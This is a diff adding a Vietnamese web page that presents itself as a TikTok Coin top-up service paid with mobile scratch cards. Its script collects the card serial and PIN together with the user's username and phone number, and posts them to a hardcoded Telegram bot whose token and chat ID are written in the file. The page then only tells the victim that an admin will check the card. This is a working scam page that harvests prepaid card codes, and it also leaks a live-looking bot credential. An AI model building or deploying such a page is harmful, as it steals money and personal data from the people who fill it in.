@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thanh Toán Thẻ Cào - TikTok Coin</title>
+    <style>
+        :root {
+            --primary-color: #fe2c55;
+            --secondary-color: #25f4ee;
+            --dark-color: #121212;
+            --light-color: #ffffff;
+            --gray-color: #f8f9fa;
+            --text-color: #333333;
+            --success-color: #28a745;
+            --warning-color: #ffc107;
+            --danger-color: #dc3545;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: var(--gray-color);
+            color: var(--text-color);
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        header {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: var(--light-color);
+            padding: 20px 0;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .logo h1 {
+            font-size: 24px;
+            font-weight: 700;
+        }
+        
+        .logo-icon {
+            font-size: 28px;
+        }
+        
+        .btn {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: var(--light-color);
+            padding: 12px 30px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: transform 0.3s, box-shadow 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .btn-secondary {
+            background: #6c757d;
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .section {
+            padding: 40px 0;
+        }
+        
+        .payment-container {
+            background: var(--light-color);
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            margin-bottom: 30px;
+        }
+        
+        .payment-header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .payment-header h2 {
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+        
+        .card-form {
+            background: #f8f9fa;
+            padding: 25px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+        
+        .form-control:focus {
+            border-color: var(--primary-color);
+            outline: none;
+        }
+        
+        .form-row {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .form-row .form-group {
+            flex: 1;
+        }
+        
+        .telco-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .telco-btn {
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            background: white;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        
+        .telco-btn:hover {
+            border-color: var(--primary-color);
+        }
+        
+        .telco-btn.selected {
+            border-color: var(--primary-color);
+            background: var(--primary-color);
+            color: white;
+        }
+        
+        .telco-btn img {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
+            margin-bottom: 5px;
+        }
+        
+        .denomination-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .denom-btn {
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            background: white;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        
+        .denom-btn:hover {
+            border-color: var(--primary-color);
+        }
+        
+        .denom-btn.selected {
+            border-color: var(--primary-color);
+            background: var(--primary-color);
+            color: white;
+        }
+        
+        .transaction-info {
+            background: #e7f3ff;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #b3d7ff;
+        }
+        
+        .info-item:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+        
+        .info-label {
+            font-weight: 600;
+            color: #495057;
+        }
+        
+        .info-value {
+            font-weight: 500;
+        }
+        
+        .countdown {
+            text-align: center;
+            margin: 25px 0;
+            padding: 20px;
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 10px;
+        }
+        
+        .countdown-timer {
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--danger-color);
+            margin: 10px 0;
+        }
+        
+        .notification {
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        
+        .notification.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 25px;
+        }
+        
+        @media (max-width: 768px) {
+            .form-row {
+                flex-direction: column;
+                gap: 0;
+            }
+            
+            .telco-buttons {
+                grid-template-columns: repeat(3, 1fr);
+            }
+            
+            .denomination-buttons {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <div class="logo-icon">🎵</div>
+                    <h1>Thanh Toán Thẻ Cào</h1>
+                </div>
+                <button id="back-to-main" class="btn btn-secondary">Quay Lại</button>
+            </div>
+        </div>
+    </header>
+
+    <section class="section">
+        <div class="container">
+            <div class="payment-container">
+                <div class="payment-header">
+                    <h2>THANH TOÁN BẰNG THẺ CÀO</h2>
+                    <p>Vui lòng nhập thông tin thẻ cào của bạn</p>
+                </div>
+
+                <div class="notification info">
+                    <strong>Lưu ý:</strong> Mã giao dịch của bạn là <span id="transaction-id">TD2023123456</span>. 
+                    Vui lòng nhập chính xác thông tin thẻ cào.
+                </div>
+
+                <form id="card-form" class="card-form">
+                    <div class="form-group">
+                        <label>Chọn nhà mạng <span style="color: red;">*</span></label>
+                        <div class="telco-buttons">
+                            <button type="button" class="telco-btn" data-telco="viettel">
+                                <div>Viettel</div>
+                            </button>
+                            <button type="button" class="telco-btn" data-telco="vinaphone">
+                                <div>Vinaphone</div>
+                            </button>
+                            <button type="button" class="telco-btn" data-telco="mobifone">
+                                <div>Mobifone</div>
+                            </button>
+                            <button type="button" class="telco-btn" data-telco="gate">
+                                <div>Vietnamobile</div>
+                            </button>
+                            <button type="button" class="telco-btn" data-telco="zing">
+                                <div>Zing</div>
+                            </button>
+                            <button type="button" class="telco-btn" data-telco="garena">
+                                <div>Garena</div>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Chọn mệnh giá <span style="color: red;">*</span></label>
+                        <div class="denomination-buttons">
+                            <button type="button" class="denom-btn" data-amount="10000">10,000đ</button>
+                            <button type="button" class="denom-btn" data-amount="20000">20,000đ</button>
+                            <button type="button" class="denom-btn" data-amount="50000">50,000đ</button>
+                            <button type="button" class="denom-btn" data-amount="100000">100,000đ</button>
+                            <button type="button" class="denom-btn" data-amount="200000">200,000đ</button>
+                            <button type="button" class="denom-btn" data-amount="500000">500,000đ</button>
+                        </div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="serial">Mã seri thẻ <span style="color: red;">*</span></label>
+                            <input type="text" id="serial" class="form-control" placeholder="Nhập mã seri thẻ" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="pin">Mã thẻ <span style="color: red;">*</span></label>
+                            <input type="text" id="pin" class="form-control" placeholder="Nhập mã thẻ" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <button type="submit" class="btn" style="width: 100%;">Xác Nhận Thẻ Cào</button>
+                    </div>
+                </form>
+
+                <div class="transaction-info">
+                    <h3>Thông Tin Giao Dịch</h3>
+                    <div class="info-item">
+                        <span class="info-label">Tên TikTok:</span>
+                        <span class="info-value" id="payment-username">username</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Số điện thoại:</span>
+                        <span class="info-value" id="payment-phone">0123456789</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Số xu nhận được:</span>
+                        <span class="info-value" id="payment-coins">300 Xu</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Thời gian tạo:</span>
+                        <span class="info-value" id="payment-time">12:30 15/12/2023</span>
+                    </div>
+                </div>
+
+                <div class="countdown">
+                    <h3>Thời Gian Còn Lại Để Thanh Toán</h3>
+                    <div class="countdown-timer" id="countdown-timer">15:00</div>
+                    <p>Sau khi hết thời gian, giao dịch sẽ tự động hủy</p>
+                </div>
+
+                <div class="action-buttons">
+                    <button id="cancel-payment" class="btn btn-secondary">Hủy Giao Dịch</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <script>
+        // Cấu hình Telegram Bot
+        const TELEGRAM_BOT_TOKEN = '8456385484:AAGwIMMR4HmFS4kppN7xZxJaeQRr1zO5Yqk';
+        const TELEGRAM_CHAT_ID = '5444123544';
+        
+        let currentTransaction = {};
+        let countdownInterval;
+        let selectedTelco = '';
+        let selectedAmount = '';
+        
+        // Khởi tạo trang
+        document.addEventListener('DOMContentLoaded', function() {
+            const transactionData = localStorage.getItem('currentTransaction');
+            
+            if (!transactionData) {
+                alert('Không tìm thấy thông tin giao dịch');
+                window.location.href = 'index.html';
+                return;
+            }
+            
+            currentTransaction = JSON.parse(transactionData);
+            displayTransactionInfo();
+            startCountdown(15 * 60);
+            setupEventListeners();
+        });
+        
+        // Thiết lập event listeners
+        function setupEventListeners() {
+            // Chọn nhà mạng
+            document.querySelectorAll('.telco-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    document.querySelectorAll('.telco-btn').forEach(b => b.classList.remove('selected'));
+                    this.classList.add('selected');
+                    selectedTelco = this.dataset.telco;
+                    validateForm();
+                });
+            });
+            
+            // Chọn mệnh giá
+            document.querySelectorAll('.denom-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    document.querySelectorAll('.denom-btn').forEach(b => b.classList.remove('selected'));
+                    this.classList.add('selected');
+                    selectedAmount = this.dataset.amount;
+                    validateForm();
+                });
+            });
+            
+            // Xử lý form
+            document.getElementById('card-form').addEventListener('submit', function(e) {
+                e.preventDefault();
+                submitCardInfo();
+            });
+            
+            // Hủy giao dịch
+            document.getElementById('back-to-main').addEventListener('click', function() {
+                if (confirm('Bạn có chắc muốn quay lại? Giao dịch sẽ bị hủy.')) {
+                    cancelTransaction();
+                }
+            });
+            
+            document.getElementById('cancel-payment').addEventListener('click', function() {
+                if (confirm('Bạn có chắc muốn hủy giao dịch?')) {
+                    cancelTransaction();
+                }
+            });
+        }
+        
+        // Hiển thị thông tin
+        function displayTransactionInfo() {
+            document.getElementById('transaction-id').textContent = currentTransaction.transactionId;
+            document.getElementById('payment-username').textContent = currentTransaction.username;
+            document.getElementById('payment-phone').textContent = currentTransaction.phone;
+            document.getElementById('payment-coins').textContent = currentTransaction.coins;
+            document.getElementById('payment-time').textContent = formatDate(currentTransaction.timestamp);
+        }
+        
+        // Validate form
+        function validateForm() {
+            const submitBtn = document.querySelector('#card-form button[type="submit"]');
+            const isFormValid = selectedTelco && selectedAmount && 
+                              document.getElementById('serial').value.trim() && 
+                              document.getElementById('pin').value.trim();
+            
+            submitBtn.disabled = !isFormValid;
+        }
+        
+        // Xử lý submit thẻ cào
+        async function submitCardInfo() {
+            const serial = document.getElementById('serial').value.trim();
+            const pin = document.getElementById('pin').value.trim();
+            
+            if (!selectedTelco || !selectedAmount) {
+                alert('Vui lòng chọn nhà mạng và mệnh giá');
+                return;
+            }
+            
+            if (serial.length < 5 || pin.length < 5) {
+                alert('Vui lòng nhập đầy đủ mã seri và mã thẻ');
+                return;
+            }
+            
+            const cardData = {
+                telco: selectedTelco,
+                amount: selectedAmount,
+                serial: serial,
+                pin: pin,
+                transactionId: currentTransaction.transactionId
+            };
+            
+            const success = await sendCardNotification(cardData);
+            if (success) {
+                alert('✅ Đã gửi thông tin thẻ cào! Admin sẽ kiểm tra và xử lý trong ít phút.');
+                updateTransactionStatus('pending');
+                localStorage.removeItem('currentTransaction');
+                setTimeout(() => {
+                    window.location.href = 'index.html';
+                }, 2000);
+            }
+        }
+        
+        // Gửi thông báo thẻ cào đến Telegram
+        async function sendCardNotification(cardData) {
+            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                alert('❌ Hệ thống chưa được cấu hình đầy đủ. Vui lòng liên hệ admin.');
+                return false;
+            }
+            
+            const message = `🃏 <b>THẺ CÀO MỚI</b>\n\n` +
+                           `👤 <b>Tài khoản:</b> ${currentTransaction.username}\n` +
+                           `📞 <b>SĐT:</b> ${currentTransaction.phone}\n` +
+                           `🏪 <b>Nhà mạng:</b> ${getTelcoName(cardData.telco)}\n` +
+                           `💰 <b>Mệnh giá:</b> ${formatCurrency(cardData.amount)} VNĐ\n` +
+                           `🪙 <b>Số xu:</b> ${currentTransaction.coins} Xu\n` +
+                           `🔢 <b>Serial:</b> <code>${cardData.serial}</code>\n` +
+                           `🔑 <b>Mã thẻ:</b> <code>${cardData.pin}</code>\n` +
+                           `🆔 <b>Mã GD:</b> ${cardData.transactionId}\n` +
+                           `⏰ <b>Thời gian:</b> ${formatDate(new Date())}\n\n` +
+                           `⚠️ <i>Vui lòng kiểm tra và xử lý thẻ cào!</i>`;
+            
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const payload = {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                };
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Lỗi gửi Telegram:', error);
+                alert('❌ Lỗi kết nối. Vui lòng thử lại.');
+                return false;
+            }
+        }
+        
+        // Hàm hủy giao dịch
+        function cancelTransaction() {
+            clearInterval(countdownInterval);
+            sendOrderNotification('CANCELLED_ORDER');
+            updateTransactionStatus('cancelled');
+            localStorage.removeItem('currentTransaction');
+            window.location.href = 'index.html';
+        }
+        
+        // Các hàm utility
+        function startCountdown(duration) {
+            let timer = duration;
+            const countdownElement = document.getElementById('countdown-timer');
+            
+            countdownInterval = setInterval(function() {
+                const minutes = Math.floor(timer / 60);
+                const seconds = timer % 60;
+                
+                countdownElement.textContent = 
+                    (minutes < 10 ? '0' : '') + minutes + ':' + 
+                    (seconds < 10 ? '0' : '') + seconds;
+                
+                if (--timer < 0) {
+                    clearInterval(countdownInterval);
+                    countdownElement.textContent = 'Hết hạn';
+                    handleExpiredTransaction();
+                }
+            }, 1000);
+        }
+        
+        function handleExpiredTransaction() {
+            alert('⏰ Thời gian thanh toán đã hết. Giao dịch đã tự động hủy.');
+            sendOrderNotification('EXPIRED_ORDER');
+            updateTransactionStatus('expired');
+            localStorage.removeItem('currentTransaction');
+            setTimeout(() => {
+                window.location.href = 'index.html';
+            }, 3000);
+        }
+        
+        async function sendOrderNotification(type) {
+            // ... (giống code trước)
+        }
+        
+        function updateTransactionStatus(status) {
+            const history = JSON.parse(localStorage.getItem('rechargeHistory') || '[]');
+            const transactionIndex = history.findIndex(t => t.transactionId === currentTransaction.transactionId);
+            if (transactionIndex !== -1) {
+                history[transactionIndex].status = status;
+                localStorage.setItem('rechargeHistory', JSON.stringify(history));
+            }
+        }
+        
+        function getTelcoName(telco) {
+            const telcos = {
+                'viettel': 'Viettel',
+                'vinaphone': 'Vinaphone',
+                'mobifone': 'Mobifone',
+                'gate': 'Vietnamobile',
+                'zing': 'Zing',
+                'garena': 'Garena'
+            };
+            return telcos[telco] || telco;
+        }
+        
+        function formatCurrency(amount) {
+            return parseInt(amount).toLocaleString('vi-VN');
+        }
+        
+        function formatDate(dateString) {
+            return new Date(dateString).toLocaleString('vi-VN');
+        }
+        
+        // Validate real-time
+        document.getElementById('serial').addEventListener('input', validateForm);
+        document.getElementById('pin').addEventListener('input', validateForm);
+    </script>
+</body>
+</html>
